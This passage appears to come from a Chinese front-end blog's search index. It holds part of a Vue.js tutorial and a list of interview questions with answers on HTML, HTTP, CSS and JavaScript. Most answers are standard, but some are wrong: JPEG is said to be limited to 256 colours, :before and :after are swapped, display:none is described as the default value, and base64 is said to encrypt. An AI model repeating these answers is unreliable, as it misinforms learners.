全部的按键别名： enter tab delete (捕获 “删除” 和 “退格” 键) esc space up down left right 为什么在 HTML 中监听事件? 你可能注意到这种事件监听的方式违背了关注点分离（separation of concern）传统理念。不必担心，因为所有的 Vue.js事件处理方法和表达式都严格绑定在当前视图的 ViewModel上，它不会导致任何维护上的困难。 实际上，使用 v-on有几个好处 扫一眼HTML 模板便能轻松定位在 JavaScript代码里对应的方法 因为你无须在 JavaScript里手动绑定事件，你的 ViewModel代码可以是非常纯粹的逻辑，和 DOM 完全解耦，更易于测试。 当一个 ViewModel被销毁时，所有的事件处理器都会自动被删除。你无须担心如何自己清理它们。 九、表单控制绑定基础用法 你可以用 v-model指令在表单控件元素上创建双向数据绑定 它会根据控件类型自动选取正确的方法来更新元素。 尽管有些神奇，但 v-model本质上不过是语法糖，它负责监听用户的输入事件以更新数据，并特别处理一些极端的例子。 v-model 并不关心表单控件初始化所生成的值。因为它会选择Vue实例数据来作为具体的值。 文本 12&lt;input v-model=\"message\" placeholder=\"edit me\"&gt;&lt;p&gt;Message is: &#123;&#123; message &#125;&#125;&lt;/p&gt; 复选框 单个勾选框，逻辑值 12&lt;input type=\"checkbox\" id=\"checkbox\" v-model=\"checked\"&gt;&lt;label for=\"checkbox\"&gt;&#123;&#123; checked&#125;&#125;&lt;/label&gt; 多个勾选框，绑定到同一个数组 1234567891011&lt;input type=\"checkbox\" id=\"jack\" value=\"Jack\" v-model=\"checkedNames\"&gt;&lt;label for=\"jack\"&gt;Jack&lt;/label&gt;&lt;input type=\"checkbox\" id=\"john\" value=\"John\" v-model=\"checkedNames\"&gt;&lt;label for=\"john\"&gt;John&lt;/label&gt;&lt;input type=\"checkbox\" id=\"mike\" value=\"Mike\" v-model=\"checkedNames\"&gt;&lt;label for=\"mike\"&gt;Mike&lt;/label&gt;&lt;span&gt;Checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/span&gt; 1new Vue(&#123; el: '...', data: &#123; checkedNames: [] &#125;&#125;) 十、组件什么是组件？ 组件（Component）是 Vue.js 最强大的功能之一。组件可以扩展HTML元素，封装可重用的代码。在较高层面上，组件是自定义元素，Vue.js 的编译器为它添加特殊功能。在有些情况下，组件也可以是原生 HTML 元素的形式，以is 特性扩展 使用组件注册 之前说过，我们可以通过以下方式创建一个 Vue实例 1new Vue(&#123; el: '#some-element', // 选项&#125;) 要注册一个全局组件，你可以使用 Vue.component(tagName, options) 。例如：Vue.component(&#39;my-component&#39;, { // 选项}) 组件在注册之后，便可以在父实例的模块中以自定义元素 &lt;my-component&gt;&lt;/my-component&gt; 的形式使用。要确保在初始化根实例 之前 注册了组件：&lt;div id=&quot;example&quot;&gt; &lt;my-component&gt;&lt;/my-component&gt;&lt;/div&gt; 123456// 注册Vue.component('my-component', &#123; template: '&lt;div&gt;A custom component!&lt;/div&gt;'&#125;)//创建根实例new Vue(&#123; el: '#example'&#125;) 渲染为：&lt;div id=&quot;example&quot;&gt; &lt;div&gt;A custom component!&lt;/div&gt;&lt;/div&gt; 局部注册 不必在全局注册每个组件。通过使用组件实例选项注册，可以使组件仅在另一个实例/组件的作用域中可用 构成组件 组件意味着协同工作，通常父子组件会是这样的关系：组件 A 在它的模版中使用了组件 B 。它们之间必然需要相互通信：父组件要给子组件传递数据，子组件需要将它内部发生的事情告知给父组件。然而，在一个良好定义的接口中尽可能将父子组件解耦是很重要的。这保证了每个组件可以在相对隔离的环境中书写和理解，也大幅提高了组件的可维护性和可重用性 在 Vue.js中，父子组件的关系可以总结为 props down, events up 。父组件通过 props 向下传递数据给子组件，子组件通过 events给父组件发送消息。看看它们是怎么工作的 Props使用Props传递数据 组件实例的作用域是孤立的。这意味着不能并且不应该在子组件的模板内直接引用父组件的数据。可以使用props把数据传给子组件。 prop是父组件用来传递数据的一个自定义属性。子组件需要显式地用 props 选项 声明 “prop”： 12345678Vue.component('child', &#123; // 声明 propsprops: ['message'],// 就像 data 一样，prop 可以用在模板内// 同样也可以在 vm 实例中像 “this.message” 这样使用template: '&lt;span&gt;&#123;&#123; message&#125;&#125;&lt;/span&gt;'&#125;) 然后向它传入一个普通字符串&lt;child message=&quot;hello!&quot;&gt;&lt;/child&gt; 结果：hello! 动态 Props 类似于用v-bind 绑定 HTML 特性到一个表达式，也可以用 v-bind 绑定动态 props到父组件的数据。每当父组件的数据变化时，也会传导给子组件： 单向数据流 prop是单向绑定的：当父组件的属性变化时，将传导给子组件，但是不会反过来。这是为了防止子组件无意修改了父组件的状态——这会让应用的数据流难以理解 另外，每次父组件更新时，子组件的所有 prop都会更新为最新值。这意味着你不应该在子组件内部改变prop 。如果你这么做了，Vue 会在控制台给出警告 十一、附录附录一 MVC、MVP、MVVM模式对比MVC 什么是MVC MVC是一种模式，它将应用分为3个部分：数据（模型）、表现层（视图）、用户交互层（控制器） 一个事件的处理大概是这样 用户和应用产生交互 控制器的事件处理器被触发 控制器从模型中请求数据，并将其交给视图 视图将数据呈现给用户 模型（数据保存） 模型用来存放用户的所有数据对象。比如有一个user模型，用来存放用户列表、他们的属性以及所有和模型有关的逻辑 模型不必知晓视图和控制器的细节，模型只需包含数据以及直接和这些数据相关的逻辑 视图（用户界面） 视图是呈现给用户的，用户与之产生交互。在JavaScript应用中，视图大都是由HTML、css、JavaScript模板组成的 控制器（业务逻辑） 控制器是模型和视图之间的纽带。控制器从视图获得事件和输入，对它们进行进行处理，并相应的更新视图。 当页面加载时，控制器会给视图添加事件监听，比如监听表单提交或按钮点击。然后当用户和你的应用产生交互时，控制器中的事件触发器就开始工作了 总结一下： Controller 监听 Model 变化，Model 一变，Controller 就会去更新View。 Controller 监听用户交互，用户点了提交或修改按钮，Controller 就要去更新 Model View 传送指令到 Controller Controller 完成业务逻辑后，要求 Model 改变状态 Model 将新的数据发送到 View，用户得到反馈 各部分之间的通信方式 互动模式 接受用户指令时，MVC 可以分成两种方式。一种是通过 View 接受指令，传递给 Controller 另一种是直接通过controller接受指令 MVP MVP 模式将 Controller 改名为Presenter`，同时改变了通信方向 各部分之间的通信，都是双向的。 View 与Model 不发生联系，都通过 Presenter 传递。 View 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而 Presenter非常厚，所有逻辑都部署在那里 MVVM MVVM 模式将 Presenter 改名为 ViewModel，基本上与 MVP 模式完全一致 唯一的区别是，它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然 附录二 vue与其他框架的对比React React 和 Vue 有许多相似之处，它们都有 使用 Virtual DOM 提供了响应式（Reactive）和组件化（Composable）的视图组件。 将注意力集中保持在核心库，伴随于此，有配套的路由和负责处理全局状态管理的库 angular1 Vue 的一些语法和 Angular的很相似（例如 v-if vs ng-if）。因为Angular是 Vue早期开发的灵感来源。然而，Angular 中存在的许多问题，在 Vue 中已经得到解决 复杂性 在 API 与设计两方面上Vue.js都比 Angular 1 简单得多，因此你可以快速地掌握它的全部特性并投入开发。 灵活性和模块化 Vue.js 是一个更加灵活开放的解决方案。它允许你以希望的方式组织应用程序，而不是在任何时候都必须遵循 Angular 1制定的规则，这让Vue能适用于各种项目。我们知道把决定权交给你是非常必要的 数据绑定 Angular 1使用双向绑定，Vue 在不同组件间强制使用单向数据流。这使应用中的数据流更加清晰易懂。 指令与组件 在 Vue 中指令和组件分得更清晰。指令只封装 DOM 操作，而组件代表一个自给自足的独立单元 —— 有自己的视图和数据逻辑。在 Angular 中两者有不少相混的地方 性能 Vue 有更好的性能，并且非常非常容易优化，因为它不使用脏检查 在 Angular 1 中，当 watchers 越来越多时会变得越来越慢，因为作用域内的每一次变化，所有 watchers都要重新计算。并且，如果一些watchers触发另一个更新，脏检查循环（digest cycle）可能要运行多次。Angular 用户常常要使用深奥的技术，以解决脏检查循环的问题。有时没有简单的办法来优化有大量 watchers的作用域 Vue 则根本没有这个问题，因为它使用基于依赖追踪的观察系统并且异步队列更新，所有的数据变化都是独立触发，除非它们之间有明确的依赖关系","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://ru23.com/tags/Vue/"}]},{"title":"前端面试题整理","slug":"2017-03-front-end-interview-summary","date":"2017-03-12T14:24:08.000Z","updated":"2018-10-24T03:46:02.083Z","comments":true,"path":"note/8fe9c4e1.html","link":"","permalink":"https://ru23.com/note/8fe9c4e1.html","excerpt":"","text":"目录$HTML， HTTP，web综合问题 1、前端需要注意哪些SEO 2、&lt;img&gt;的title和alt有什么区别 3、HTTP的几种请求方法用途 4、从浏览器地址栏输入url到显示页面的步骤 5、如何进行网站性能优化 6、HTTP状态码及其含义 7、语义化的理解 8、介绍一下你对浏览器内核的理解 9、html5有哪些新特性、移除了那些元素？ 10、HTML5的离线储存怎么使用，工作原理能不能解释一下？ 11、浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢 12、请描述一下 cookies，sessionStorage 和 localStorage 的区别 13、iframe有那些缺点？ 14、WEB标准以及W3C标准是什么? 15、xhtml和html有什么区别? 16、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义? 17、行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？ 18、HTML全局属性(global attribute)有哪些 19、Canvas和SVG有什么区别？ 20、HTML5 为什么只需要写 &lt;!DOCTYPE HTML&gt;？ 21、如何在页面上实现一个圆形的可点击区域？ 22、网页验证码是干嘛的，是为了解决什么安全问题 $CSS部分 1、css sprite是什么,有什么优缺点 2、display: none;与visibility: hidden;的区别 3、link与@import的区别 4、什么是FOUC?如何避免 5、如何创建块级格式化上下文(block formatting context),BFC有什么用 7、清除浮动的几种方式，各自的优缺点 8、为什么要初始化CSS样式? 9、css3有哪些新特性 10、display有哪些值？说明他们的作用 11、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？ 12、CSS优先级算法如何计算？ 13、对BFC规范的理解？ 14、谈谈浮动和清除浮动 15、position的值， relative和absolute`定位原点是 16、display:inline-block 什么时候不会显示间隙？(携程) 17、PNG,GIF,JPG的区别及如何选 18、行内元素float:left后是否变为块级元素？ 19、在网页中的应该使用奇数还是偶数的字体？为什么呢？ 20、::before 和 :after中双冒号和单冒号有什么区别？解释一下这2个伪元素的作用 21、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里） 22、CSS合并方法 23、CSS不同选择器的权重(CSS层叠的规则) 24、列出你所知道可以改变页面布局的属性 25、CSS在性能优化方面的实践 26、CSS3动画（简单动画的实现，如旋转等） 27、base64的原理及优缺点 $JavaScript 1、闭包 2、说说你对作用域链的理解 3、JavaScript原型，原型链 ? 有什么特点？ 4、请解释什么是事件代理 5、Javascript如何实现继承？ 6、谈谈This对象的理解 7、事件模型 8、new操作符具体干了什么呢? 9、Ajax原理 11、模块化开发怎么做？ 12、异步加载JS的方式有哪些？ 13、那些操作会造成内存泄漏？ 14、XML和JSON的区别？ 15、谈谈你对webpack的看法 17、常见web安全及防护原理 18、用过哪些设计模式？ 19、为什么要有同源限制？ 20、offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别 21、javascript有哪些方法定义对象 22、常见兼容性问题？ 22、说说你对promise的了解 23、你觉得jQuery源码有哪些写的好的地方 25、Node的应用场景 26、谈谈你对AMD、CMD的理解 27、那些操作会造成内存泄漏？ 28、web开发中会话跟踪的方法有哪些 29、介绍js的基本数据类型 30、介绍js有哪些内置对象？ 31、说几条写JavaScript的基本规范？ 32、JavaScript有几种类型的值？，你能画一下他们的内存图吗？ 33、javascript创建对象的几种方式？ 34、eval是做什么的？ 35、null，undefined 的区别？ 36、[“1”, “2”, “3”].map(parseInt) 答案是多少？ 37、javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？ 38、JSON的了解？ 39、js延迟加载的方式有哪些？ 40、同步和异步的区别? 41、渐进增强和优雅降级 42、defer和async 43、说说严格模式的限制 44、attribute和property的区别是什么？ 45、谈谈你对ES6的理解 46、ECMAScript6 怎么写class么，为什么会出现class这种东西? 47、什么是面向对象编程及面向过程编程，它们的异同和优缺点 48、从你自己的理解来看，你是如何理解面向对象编程的，它解决了什么问题，有什么作用 49、对web标准、可用性、可访问性的理解 $编程题 1、写一个通用的事件侦听器函数 2、如何判断一个对象是否为数组 3、冒泡排序 4、快速排序 5、编写一个方法 求一个字符串的字节长度 $其他 1、谈谈你对重构的理解 2、什么样的前端代码是好的 3、对前端工程师这个职位是怎么样理解的？它的前景会怎么样？ 4、你觉得前端工程的价值体现在哪 5、平时如何管理你的项目？ 人事面 面试完你还有什么问题要问的吗 你有什么爱好? 你最大的优点和缺点是什么? 你为什么会选择这个行业，职位? 你觉得你适合从事这个岗位吗? 你有什么职业规划? 你对工资有什么要求? 如何看待前端开发？ 未来三到五年的规划是怎样的？ 常问 自我介绍 你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？ 你认为哪个项目做得最好？ 最近在看哪些前端方面的书？ 平时是如何学习前端开发的？ 你最有成就感的一件事 你是怎么学习前端的 $HTML， HTTP，web综合问题1、前端需要注意哪些SEO 合理的title、description、keywords：搜索对着三项的权重逐个减小，title值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面title要有所不同；description把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面description有所不同；keywords列举出重要关键词即可 语义化的HTML代码，符合W3C规范：语义化代码让搜索引擎容易理解网页 重要内容HTML代码放在最前：搜索引擎抓取HTML顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容一定会被抓取 重要内容不要用js输出：爬虫不会执行js获取内容 少用iframe：搜索引擎不会抓取iframe中的内容 非装饰性图片必须加alt 提高网站速度：网站速度是搜索引擎排序的一个重要指标 2、&lt;img&gt;的title和alt有什么区别 通常当鼠标滑动到元素上的时候显示 alt是&lt;img&gt;的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。 3、HTTP的几种请求方法用途 1、GET方法 发送一个请求来取得服务器上的某一资源 2、POST方法 向URL指定的资源提交数据或附加新的数据 3、PUT方法 跟POST方法很像，也是想服务器提交数据。但是，它们之间有不同。PUT指定了资源在服务器上的位置，而POST没有 4、HEAD方法 只请求页面的首部 5、DELETE方法 删除服务器上的某资源 6、OPTIONS方法 它用于获取当前URL所支持的方法。如果请求成功，会有一个Allow的头包含类似“GET,POST”这样的信息 7、TRACE方法 TRACE方法被用于激发一个远程的，应用层的请求消息回路 8、CONNECT方法 把请求连接转换到透明的TCP/IP通道 4、从浏览器地址栏输入url到显示页面的步骤 浏览器根据请求的URL交给DNS域名解析，找到真实IP，向服务器发起请求； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。 5、如何进行网站性能优化 content方面 减少HTTP请求：合并文件、CSS精灵、inline Image 减少DNS查询：DNS缓存、将资源分布到恰当数量的主机名 减少DOM元素数量 Server方面 使用CDN 配置ETag 对组件使用Gzip压缩 Cookie方面 减小cookie大小 css方面 将样式表放到页面顶部 不使用CSS表达式 使用&lt;link&gt;不使用@import Javascript方面 将脚本放到页面底部 将javascript和css从外部引入 压缩javascript和css 删除不需要的脚本 减少DOM访问 图片方面 优化图片：根据实际颜色需要选择色深、压缩 优化css精灵 不要在HTML中拉伸图片 6、HTTP状态码及其含义 1XX：信息状态码 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 2XX：成功状态码 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 3XX：重定向 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 4XX：客户端错误 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。 5XX: 服务器错误 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 7、语义化的理解 用正确的标签做正确的事情！ html语义化就是让页面的内容结构化，便于对浏览器、搜索引擎解析； 在没有样式CSS情况下也以一种文档格式显示，并且是容易阅读的。 搜索引擎的爬虫依赖于标记来确定上下文和各个关键字的权重，利于 SEO。 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解 8、介绍一下你对浏览器内核的理解？ 主要分成两部分：渲染引擎(layout engineer或Rendering Engine)和JS引擎 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核 JS引擎则：解析和执行javascript来实现网页的动态效果 最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎 9、html5有哪些新特性、移除了那些元素？ HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加 绘画 canvas 用于媒介回放的 video 和 audio 元素 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失 sessionStorage 的数据在浏览器关闭后自动删除 语意化更好的内容元素，比如article、footer、header、nav、section 表单控件，calendar、date、time、email、url、search 新的技术webworker, websocket, Geolocation 移除的元素： 纯表现的元素：basefont，big，center，font, s，strike，tt，u` 对可用性产生负面影响的元素：frame，frameset，noframes 支持HTML5新标签： IE8/IE7/IE6支持通过document.createElement方法产生的标签 可以利用这一特性让这些浏览器支持HTML5新标签 浏览器支持新标签后，还需要添加标签默认的样式 当然也可以直接使用成熟的框架、比如html5shim 10、HTML5的离线储存怎么使用，工作原理能不能解释一下？ 在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件 原理：HTML5的离线存储是基于一个新建的.appcache文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示 如何使用： 页面头部像下面一样加入一个manifest的属性； 在cache.manifest文件的编写离线存储的资源 在离线状态时，操作window.applicationCache进行需求实现 123456789CACHE MANIFEST#v0.11CACHE:js/app.jscss/style.cssNETWORK:resourse/logo.pngFALLBACK:/ /offline.html 11、浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢 在线的情况下，浏览器发现html头部有manifest属性，它会请求manifest文件，如果是第一次访问app，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过app并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的manifest文件与旧的manifest文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。 离线的情况下，浏览器就直接使用离线存储的资源。 12、请描述一下 cookies，sessionStorage 和 localStorage 的区别？ cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密） cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递 sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存 存储大小： cookie数据大小不能超过4k sessionStorage和localStorage虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大 有期时间： localStorage 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据 sessionStorage 数据在当前浏览器窗口关闭后自动删除 cookie 设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭 13、iframe有那些缺点？ iframe会阻塞主页面的Onload事件 搜索引擎的检索程序无法解读这种页面，不利于SEO iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载 使用iframe之前需要考虑这两个缺点。如果需要使用iframe，最好是通过javascript动态给iframe添加src属性值，这样可以绕开以上两个问题 14、WEB标准以及W3C标准是什么? 标签闭合、标签小写、不乱嵌套、使用外链css和js、结构行为表现的分离 15、xhtml和html有什么区别? 一个是功能上的差别 主要是XHTML可兼容各大浏览器、手机以及PDA，并且浏览器也能快速正确地编译网页 另外是书写习惯的差别 XHTML 元素必须被正确地嵌套，闭合，区分大小写，文档必须拥有根元素 16、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义? 页面被加载的时，link会同时被加载，而@imort页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载import只在IE5以上才能识别，而link是XHTML标签，无兼容问题link方式的样式的权重 高于@import的权重 &lt;!DOCTYPE&gt; 声明位于文档中的最前面，处于 &lt;html&gt; 标签之前。告知浏览器的解析器， 用什么文档类型 规范来解析这个文档 严格模式的排版和 JS 运作模式是 以该浏览器支持的最高标准运行 在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现 17、行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？ 行内元素有：a b span img input select strong 块级元素有：div ul ol li dl dt dd h1 h2 h3 h4…p 空元素：&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;input&gt; &lt;link&gt; &lt;meta&gt; 行内元素不可以设置宽高，不独占一行 块级元素可以设置宽高，独占一行 18、HTML全局属性(global attribute)有哪些 class:为元素设置类标识 data-*: 为元素增加自定义属性 draggable: 设置元素是否可拖拽 id: 元素id，文档内唯一 lang: 元素内容的的语言 style: 行内css样式 title: 元素相关的建议信息 19、Canvas和SVG有什么区别？ svg绘制出来的每一个图形的元素都是独立的DOM节点，能够方便的绑定事件或用来修改。canvas输出的是一整幅画布 svg输出的图形是矢量图形，后期可以修改参数来自由放大缩小，不会是真和锯齿。而canvas输出标量画布，就像一张图片一样，放大会失真或者锯齿 20、HTML5 为什么只需要写 &lt;!DOCTYPE HTML&gt;？ HTML5 不基于 SGML，因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型 21、如何在页面上实现一个圆形的可点击区域？ svg border-radius 纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等 22、网页验证码是干嘛的，是为了解决什么安全问题 区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水 有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试 $CSS部分1、css sprite是什么,有什么优缺点 概念：将多个小图片拼接到一个图片中。通过background-position和元素尺寸调节需要显示的背景图案。 优点： 减少HTTP请求数，极大地提高页面加载速度 增加图片信息重复度，提高压缩比，减少图片大小 更换风格方便，只需在一张或几张图片上修改颜色或样式即可实现 缺点： 图片合并麻烦 维护麻烦，修改一个图片可能需要从新布局整个图片，样式 2、display: none;与visibility: hidden;的区别 联系：它们都能让元素不可见 区别： display:none;会让元素完全从渲染树中消失，渲染的时候不占据任何空间；visibility: hidden;不会让元素从渲染树消失，渲染师元素继续占据空间，只是内容不可见 display: none;是非继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示；visibility: hidden;是继承属性，子孙节点消失由于继承了hidden，通过设置visibility: visible;可以让子孙节点显式 修改常规流中元素的display通常会造成文档重排。修改visibility属性只会造成本元素的重绘。 读屏器不会读取display: none;元素内容；会读取visibility: hidden;元素内容 3、link与@import的区别 link是HTML方式， @import是CSS方式 link最大限度支持并行下载，@import过多嵌套导致串行下载，出现FOUC link可以通过rel=&quot;alternate stylesheet&quot;指定候选样式 浏览器对link支持早于@import，可以使用@import对老浏览器隐藏样式 @import必须在样式规则之前，可以在css文件中引用其他文件 总体来说：link优于@import 4、什么是FOUC?如何避免 Flash Of Unstyled Content：用户定义样式表加载之前浏览器使用默认样式显示文档，用户样式加载渲染之后再从新显示文档，造成页面闪烁。 解决方法：把样式表放到文档的head 5、如何创建块级格式化上下文(block formatting context),BFC有什么用 创建规则： 根元素 浮动元素（float不是none） 绝对定位元素（position取值为absolute或fixed） display取值为inline-block,table-cell, table-caption,flex, inline-flex之一的元素 overflow不是visible的元素 作用： 可以包含浮动元素 不被浮动元素覆盖 阻止父子元素的margin折叠 6、display,float,position的关系 如果display为none，那么position和float都不起作用，这种情况下元素不产生框 否则，如果position值为absolute或者fixed，框就是绝对定位的，float的计算值为none，display根据下面的表格进行调整。 否则，如果float不是none，框是浮动的，display根据下表进行调整 否则，如果元素是根元素，display根据下表进行调整 其他情况下display的值为指定值 总结起来：绝对定位、浮动、根元素都需要调整display 7、清除浮动的几种方式，各自的优缺点 父级div定义height 结尾处加空div标签clear:both 父级div定义伪类:after和zoom 父级div定义overflow:hidden 父级div也浮动，需要定义宽度 结尾处加br标签clear:both 比较好的是第3种方式，好多网站都这么用 8、为什么要初始化CSS样式? 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。 当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化 9、css3有哪些新特性 新增各种css选择器 圆角 border-radius 多列布局 阴影和反射 文字特效text-shadow 线性渐变 旋转transform CSS3新增伪类有那些？ p:first-of-type 选择属于其父元素的首个&lt;p&gt;元素的每个&lt;p&gt; 元素。 p:last-of-type 选择属于其父元素的最后 &lt;p&gt; 元素的每个&lt;p&gt; 元素。 p:only-of-type 选择属于其父元素唯一的 &lt;p&gt;元素的每个 &lt;p&gt; 元素。 p:only-child 选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。 :after 在元素之前添加内容,也可以用来做清除浮动。 :before 在元素之后添加内容 :enabled :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中 10、display有哪些值？说明他们的作用 block 象块类型元素一样显示。 none 缺省值。象行内元素类型一样显示。 inline-block 象行内元素一样显示，但其内容象块类型元素一样显示。 list-item 象块类型元素一样显示，并添加样式列表标记。 table 此元素会作为块级表格来显示 inherit 规定应该从父元素继承 display 属性的值 11、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？ 有两种， IE盒子模型、W3C盒子模型； 盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)； 区 别： IE的content部分把 border 和 padding计算了进去; 12、CSS优先级算法如何计算？ 优先级就近原则，同权重情况下样式定义最近者为准 载入样式以最后载入的定位为准 优先级为: !important &gt; id &gt; class &gt; tag important 比 内联优先级高 13、对BFC规范的理解？ 它决定了元素如何对其内容进行定位,以及与其他元素的关系和相互作用 14、谈谈浮动和清除浮动 浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上 15、position的值， relative和absolute定位原点是 absolute：生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位 fixed：生成绝对定位的元素，相对于浏览器窗口进行定位 relative：生成相对定位的元素，相对于其正常位置进行定位 static 默认值。没有定位，元素出现在正常的流中 inherit 规定从父元素继承 position 属性的值 16、display:inline-block 什么时候不会显示间隙？(携程) 移除空格 使用margin负值 使用font-size:0 letter-spacing word-spacing 17、PNG,GIF,JPG的区别及如何选 GIF 8位像素，256色 无损压缩 支持简单动画 支持boolean透明 适合简单动画 JPEG 颜色限于256 有损压缩 可控制压缩质量 不支持透明 适合照片 PNG 有PNG8和truecolor PNG PNG8类似GIF颜色上限为256，文件小，支持alpha透明度，无动画 适合图标、背景、按钮 18、行内元素float:left后是否变为块级元素？ 浮动后，行内元素不会成为块状元素，但是可以设置宽高。行内元素要想变成块状元素，占一行，直接设置display:block;。但如果元素设置了浮动后再设置display:block;那就不会占一行。 19、在网页中的应该使用奇数还是偶数的字体？为什么呢？ 偶数字号相对更容易和 web 设计的其他部分构成比例关系 20、::before 和 :after中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用 单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素 用于区分伪类和伪元素 21、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里） 多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms 22、CSS合并方法 避免使用@import引入多个css文件，可以使用CSS工具将CSS合并为一个CSS文件，例如使用Sass\\Compass等 23、CSS不同选择器的权重(CSS层叠的规则) ！important规则最重要，大于其它规则 行内样式规则，加1000 对于选择器中给定的各个ID属性值，加100 对于选择器中给定的各个类属性、属性选择器或者伪类选择器，加10 对于选择其中给定的各个元素标签选择器，加1 如果权值一样，则按照样式规则的先后顺序来应用，顺序靠后的覆盖靠前的规则 24、列出你所知道可以改变页面布局的属性 position、display、float、width、height、margin、padding、top、left、right、` 25、CSS在性能优化方面的实践 css压缩与合并、Gzip压缩 css文件放在head里、不要用@import 尽量用缩写、避免用滤镜、合理使用选择器 26、CSS3动画（简单动画的实现，如旋转等） 依靠CSS3中提出的三个属性：transition、transform、animation transition：定义了元素在变化过程中是怎么样的，包含transition-property、transition-duration、transition-timing-function、transition-delay。 transform：定义元素的变化结果，包含rotate、scale、skew、translate。 animation：动画定义了动作的每一帧（@keyframes）有什么效果，包括animation-name，animation-duration、animation-timing-function、animation-delay、animation-iteration-count、animation-direction 27、base64的原理及优缺点 优点可以加密，减少了http请求 缺点是需要消耗CPU进行编解码 $JavaScript1、闭包 闭包就是能够读取其他函数内部变量的函数 闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域 